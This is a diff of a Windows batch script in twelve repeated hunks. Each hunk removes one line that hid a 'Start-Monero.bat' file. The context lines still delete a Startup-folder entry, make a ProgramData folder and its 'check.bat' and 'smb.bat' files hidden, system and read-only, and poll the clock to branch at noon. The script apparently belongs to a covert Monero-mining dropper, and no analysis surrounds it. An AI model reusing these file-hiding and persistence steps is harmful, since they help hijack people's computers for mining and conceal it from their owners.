@@ -84,7 +84,7 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
-attrib +h +s +r "C:\ProgramData\PSU\Start-Monero.bat"
+
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
@@ -150,7 +150,7 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
-attrib +h +s +r "C:\ProgramData\PSU\Start-Monero.bat"
+
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
@@ -216,7 +216,7 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
-attrib +h +s +r "C:\ProgramData\PSU\Start-Monero.bat"
+
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
@@ -282,7 +282,7 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
-attrib +h +s +r "C:\ProgramData\PSU\Start-Monero.bat"
+
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
@@ -357,7 +357,7 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
-attrib +h +s +r "C:\ProgramData\PSU\Start-Monero.bat"
+
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
@@ -423,7 +423,7 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
-attrib +h +s +r "C:\ProgramData\PSU\Start-Monero.bat"
+
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
@@ -489,7 +489,7 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
-attrib +h +s +r "C:\ProgramData\PSU\Start-Monero.bat"
+
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
@@ -555,7 +555,7 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
-attrib +h +s +r "C:\ProgramData\PSU\Start-Monero.bat"
+
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
@@ -630,7 +630,7 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
-attrib +h +s +r "C:\ProgramData\PSU\Start-Monero.bat"
+
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
@@ -696,7 +696,7 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
-attrib +h +s +r "C:\ProgramData\PSU\Start-Monero.bat"
+
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
@@ -762,7 +762,7 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
-attrib +h +s +r "C:\ProgramData\PSU\Start-Monero.bat"
+
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
@@ -828,7 +828,7 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
-attrib +h +s +r "C:\ProgramData\PSU\Start-Monero.bat"
+
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
